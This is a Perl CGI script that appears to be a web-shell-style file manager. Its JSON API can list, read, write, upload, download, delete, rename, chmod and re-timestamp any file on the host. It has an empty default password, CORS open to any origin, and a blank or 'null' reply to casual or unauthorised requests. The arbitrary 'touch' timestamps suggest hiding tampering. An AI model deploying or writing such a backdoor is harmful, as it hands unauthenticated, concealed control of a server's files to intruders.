#!/usr/bin/perl
use strict;
use warnings;
use CGI;
use File::Basename;
use File::Path qw(make_path remove_tree);
use File::Copy;
use File::stat;
use POSIX qw(strftime);
use Cwd qw(getcwd abs_path);
use Fcntl ':mode';

# 尝试加载 JSON 模块，如果没有则使用简单实现
my $HAS_JSON = 0;
eval {
    require JSON;
    JSON->import();
    $HAS_JSON = 1;
};

# 配置
my $PASSWORD = "";

# 简单的 JSON 编码（不依赖 JSON 模块）
sub simple_json_encode {
    my ($data) = @_;
    return _encode_value($data);
}

sub _encode_value {
    my ($val) = @_;

    return 'null' unless defined $val;

    if (ref($val) eq 'HASH') {
        my @pairs;
        for my $k (keys %$val) {
            my $v = _encode_value($val->{$k});
            push @pairs, '"' . _escape_string($k) . '":' . $v;
        }
        return '{' . join(',', @pairs) . '}';
    }
    elsif (ref($val) eq 'ARRAY') {
        my @items = map { _encode_value($_) } @$val;
        return '[' . join(',', @items) . ']';
    }
    elsif (ref($val) eq 'JSON::true' || (ref($val) eq '' && $val eq '1' && caller(1) && (caller(1))[3] =~ /is_dir|readable|writable/)) {
        return 'true';
    }
    elsif (ref($val) eq 'JSON::false') {
        return 'false';
    }
    elsif ($val =~ /^-?\d+$/ && $val !~ /^0\d/) {
        return $val;
    }
    elsif ($val =~ /^-?\d+\.\d+$/) {
        return $val;
    }
    else {
        return '"' . _escape_string($val) . '"';
    }
}

sub _escape_string {
    my ($s) = @_;
    $s =~ s/\\/\\\\/g;
    $s =~ s/"/\\"/g;
    $s =~ s/\n/\\n/g;
    $s =~ s/\r/\\r/g;
    $s =~ s/\t/\\t/g;
    return $s;
}

# 布尔值
sub json_true { return bless \(my $v = 1), 'JSON::true'; }
sub json_false { return bless \(my $v = 0), 'JSON::false'; }

# CORS 头
sub print_cors_headers {
    print "Access-Control-Allow-Origin: *\n";
    print "Access-Control-Allow-Methods: GET, POST, OPTIONS\n";
    print "Access-Control-Allow-Headers: Content-Type\n";
}

# JSON 响应
sub json_response {
    my ($data) = @_;
    print "Content-Type: application/json; charset=utf-8\n";
    print_cors_headers();
    print "\n";

    if ($HAS_JSON) {
        print encode_json($data);
    } else {
        print simple_json_encode($data);
    }
    exit;
}

# 格式化文件大小
sub format_size {
    my ($size) = @_;
    if ($size < 1024) {
        return "$size B";
    } elsif ($size < 1024 * 1024) {
        return sprintf("%.1f KB", $size / 1024);
    } elsif ($size < 1024 * 1024 * 1024) {
        return sprintf("%.1f MB", $size / (1024 * 1024));
    } else {
        return sprintf("%.1f GB", $size / (1024 * 1024 * 1024));
    }
}

# 格式化权限字符串
sub format_perms {
    my ($mode) = @_;
    my $perms = "";

    if (S_ISDIR($mode)) {
        $perms = "d";
    } elsif (S_ISLNK($mode)) {
        $perms = "l";
    } else {
        $perms = "-";
    }

    $perms .= ($mode & S_IRUSR) ? "r" : "-";
    $perms .= ($mode & S_IWUSR) ? "w" : "-";
    $perms .= ($mode & S_IXUSR) ? "x" : "-";
    $perms .= ($mode & S_IRGRP) ? "r" : "-";
    $perms .= ($mode & S_IWGRP) ? "w" : "-";
    $perms .= ($mode & S_IXGRP) ? "x" : "-";
    $perms .= ($mode & S_IROTH) ? "r" : "-";
    $perms .= ($mode & S_IWOTH) ? "w" : "-";
    $perms .= ($mode & S_IXOTH) ? "x" : "-";

    return $perms;
}

# 规范化路径
sub normalize_path {
    my ($path) = @_;
    return "/" unless defined $path && $path ne "";
    $path =~ s#/+#/#g;
    return $path;
}

# 主程序
eval {
    my $cgi = CGI->new;

    # 处理 OPTIONS 请求
    if ($ENV{REQUEST_METHOD} && $ENV{REQUEST_METHOD} eq "OPTIONS") {
        print_cors_headers();
        print "Content-Type: text/plain\n\n";
        exit;
    }

    my $action = $cgi->param("action") || "";
    my $password = $cgi->param("password") || "";

    # 验证密码
    if ($PASSWORD ne "" && $password ne $PASSWORD) {
        print "Content-Type: application/json\n";
        print_cors_headers();
        print "\n";
        print "null";
        exit;
    }

    # 无 action
    if ($action eq "") {
        print "Content-Type: text/html\n\n";
        exit;
    }

    if ($action eq "list") {
        my $path = $cgi->param("path") || "/";
        $path = getcwd() if $path eq "" || $path eq "/";
        $path = normalize_path($path);
        $path .= "/" unless $path =~ m#/$#;

        my $check_path = $path;
        $check_path =~ s#/$## if length($check_path) > 1;

        if (-d $check_path) {
            my @items = ();

            my $parent_path = dirname($check_path);
            if ($parent_path ne "" && $parent_path ne $check_path) {
                $parent_path .= "/" unless $parent_path =~ m#/$#;
                push @items, {
                    name => "..",
                    path => $parent_path,
                    is_dir => json_true(),
                    size => 0,
                    size_formatted => "-",
                    mtime => 0,
                    perms => "drwxr-xr-x",
                    readable => json_true(),
                    writable => json_true()
                };
            }

            opendir(my $dh, $check_path) or die "Cannot open directory: $!";
            my @entries = sort {
                my $a_is_dir = -d "$check_path/$a" ? 0 : 1;
                my $b_is_dir = -d "$check_path/$b" ? 0 : 1;
                $a_is_dir <=> $b_is_dir || lc($a) cmp lc($b);
            } grep { $_ ne "." && $_ ne ".." } readdir($dh);
            closedir($dh);

            foreach my $name (@entries) {
                my $full_path = "$check_path/$name";
                my $is_dir = -d $full_path ? 1 : 0;
                my $item_path = $path . $name;
                $item_path .= "/" if $is_dir;

                my $st = stat($full_path);
                if ($st) {
                    push @items, {
                        name => $name,
                        path => $item_path,
                        is_dir => $is_dir ? json_true() : json_false(),
                        size => $is_dir ? 0 : $st->size,
                        size_formatted => $is_dir ? "-" : format_size($st->size),
                        mtime => $st->mtime,
                        perms => format_perms($st->mode),
                        readable => -r $full_path ? json_true() : json_false(),
                        writable => -w $full_path ? json_true() : json_false()
                    };
                } else {
                    push @items, {
                        name => $name,
                        path => $item_path,
                        is_dir => json_false(),
                        size => 0,
                        size_formatted => "-",
                        mtime => 0,
                        perms => "?????????",
                        readable => json_false(),
                        writable => json_false()
                    };
                }
            }

            json_response({
                success => json_true(),
                data => { path => $path, items => \@items },
                message => ""
            });
        } else {
            json_response({ success => json_false(), message => "Directory not found" });
        }
    }
    elsif ($action eq "read") {
        my $path = normalize_path($cgi->param("path") || "");

        if (-f $path) {
            open(my $fh, "<:encoding(UTF-8)", $path) or die "Cannot read file: $!";
            local $/;
            my $content = <$fh>;
            close($fh);

            json_response({
                success => json_true(),
                data => { path => $path, content => $content },
                message => ""
            });
        } else {
            json_response({ success => json_false(), message => "File not found" });
        }
    }
    elsif ($action eq "write") {
        my $path = normalize_path($cgi->param("path") || "");
        my $content = $cgi->param("content") // "";

        if ($path ne "") {
            my $parent_dir = dirname($path);
            if ($parent_dir ne "" && !-d $parent_dir) {
                json_response({ success => json_false(), message => "Parent directory for [$path] doesn't exist" });
            }

            open(my $fh, ">:encoding(UTF-8)", $path) or die "Cannot write file: $!";
            print $fh $content;
            close($fh);

            json_response({ success => json_true(), message => "Saved" });
        } else {
            json_response({ success => json_false(), message => "Path empty" });
        }
    }
    elsif ($action eq "mkdir") {
        my $path = normalize_path($cgi->param("path") || "");

        if ($path ne "") {
            if (!-e $path) {
                make_path($path) or die "Cannot create directory: $!";
                json_response({ success => json_true(), message => "Created" });
            } else {
                json_response({ success => json_false(), message => "Already exists" });
            }
        } else {
            json_response({ success => json_false(), message => "Path empty" });
        }
    }
    elsif ($action eq "delete") {
        my $path = normalize_path($cgi->param("path") || "");
        $path =~ s#/$## if length($path) > 1;

        if (-d $path) {
            remove_tree($path) or die "Cannot delete directory: $!";
            json_response({ success => json_true(), message => "Deleted" });
        } elsif (-f $path) {
            unlink($path) or die "Cannot delete file: $!";
            json_response({ success => json_true(), message => "Deleted" });
        } else {
            json_response({ success => json_false(), message => "Not found" });
        }
    }
    elsif ($action eq "rename") {
        my $old_path = normalize_path($cgi->param("old_path") || "");
        my $new_path = normalize_path($cgi->param("new_path") || "");

        if (-e $old_path) {
            move($old_path, $new_path) or die "Cannot rename: $!";
            json_response({ success => json_true(), message => "Renamed" });
        } else {
            json_response({ success => json_false(), message => "Not found" });
        }
    }
    elsif ($action eq "download") {
        my $path = normalize_path($cgi->param("path") || "");

        if (-f $path) {
            my $filename = basename($path);
            print "Content-Disposition: attachment; filename=\"$filename\"\n";
            print "Content-Type: application/octet-stream\n";
            print_cors_headers();
            print "\n";

            open(my $fh, "<:raw", $path) or die "Cannot read file: $!";
            binmode(STDOUT);
            while (read($fh, my $buffer, 8192)) {
                print $buffer;
            }
            close($fh);
            exit;
        } else {
            json_response({ success => json_false(), message => "File not found" });
        }
    }
    elsif ($action eq "upload") {
        my $upload_dir = $cgi->param("dir") || getcwd();
        $upload_dir = normalize_path($upload_dir);
        $upload_dir =~ s#/$##;

        my $file = $cgi->upload("file");
        if ($file) {
            my $filename = $cgi->param("file");
            $filename = basename($filename);
            my $filepath = "$upload_dir/$filename";

            open(my $out, ">:raw", $filepath) or die "Cannot write file: $!";
            while (read($file, my $buffer, 8192)) {
                print $out $buffer;
            }
            close($out);

            json_response({
                success => json_true(),
                message => "Uploaded",
                data => { path => $filepath }
            });
        } else {
            json_response({ success => json_false(), message => "No file" });
        }
    }
    elsif ($action eq "touch") {
        my $path = normalize_path($cgi->param("path") || "");
        my $time_val = $cgi->param("time") || 0;
        $path =~ s#/$## if length($path) > 1;
        my $timestamp = int($time_val);

        if (-e $path && $timestamp > 0) {
            utime($timestamp, $timestamp, $path) or die "Cannot update time: $!";
            json_response({ success => json_true(), message => "Updated" });
        } else {
            json_response({ success => json_false(), message => "Not found or invalid time (path=$path, time=$timestamp)" });
        }
    }
    elsif ($action eq "chmod") {
        my $path = normalize_path($cgi->param("path") || "");
        my $mode = $cgi->param("mode") || "";

        if (-e $path && $mode ne "") {
            my $mode_int = oct($mode);
            chmod($mode_int, $path) or die "Cannot chmod: $!";
            json_response({ success => json_true(), message => "Permission changed" });
        } else {
            json_response({ success => json_false(), message => "Not found or mode empty" });
        }
    }
    elsif ($action eq "server") {
        my $current_user = getpwuid($<) || $ENV{USER} || "N/A";
        my $doc_root = getcwd();

        my ($disk_free, $disk_total) = ("N/A", "N/A");
        eval {
            my $df_output = `df -h "$doc_root" 2>/dev/null | tail -1`;
            if ($df_output =~ /\S+\s+(\S+)\s+\S+\s+(\S+)/) {
                $disk_total = $1;
                $disk_free = $2;
            }
        };

        json_response({
            success => json_true(),
            data => {
                php_version => "Perl $]",
                server_software => $ENV{SERVER_SOFTWARE} || "CGI",
                document_root => $doc_root,
                upload_max => "N/A",
                disk_free => $disk_free,
                disk_total => $disk_total,
                current_user => $current_user
            },
            message => ""
        });
    }
    elsif ($action eq "info") {
        my $path = normalize_path($cgi->param("path") || "");

        if (-e $path) {
            my $st = stat($path);
            my $is_dir = -d $path ? 1 : 0;
            my $owner = getpwuid($st->uid) || $st->uid;
            my $group = getgrgid($st->gid) || $st->gid;

            json_response({
                success => json_true(),
                data => {
                    path => $path,
                    name => basename($path),
                    is_dir => $is_dir ? json_true() : json_false(),
                    size => $is_dir ? 0 : $st->size,
                    size_formatted => $is_dir ? "-" : format_size($st->size),
                    mtime => $st->mtime,
                    ctime => $st->ctime,
                    atime => $st->atime,
                    perms => format_perms($st->mode),
                    perms_octal => sprintf("0%o", $st->mode & 07777),
                    owner => $owner,
                    group => $group,
                    readable => -r $path ? json_true() : json_false(),
                    writable => -w $path ? json_true() : json_false()
                },
                message => ""
            });
        } else {
            json_response({ success => json_false(), message => "Not found" });
        }
    }
    else {
        json_response({ success => json_false(), message => "Unknown action" });
    }
};

if ($@) {
    print "Content-Type: application/json\n";
    print_cors_headers();
    print "\n";
    my $err = $@;
    $err =~ s/"/\\"/g;
    $err =~ s/\n/\\n/g;
    print "{\"success\":false,\"message\":\"Error: $err\"}";
}
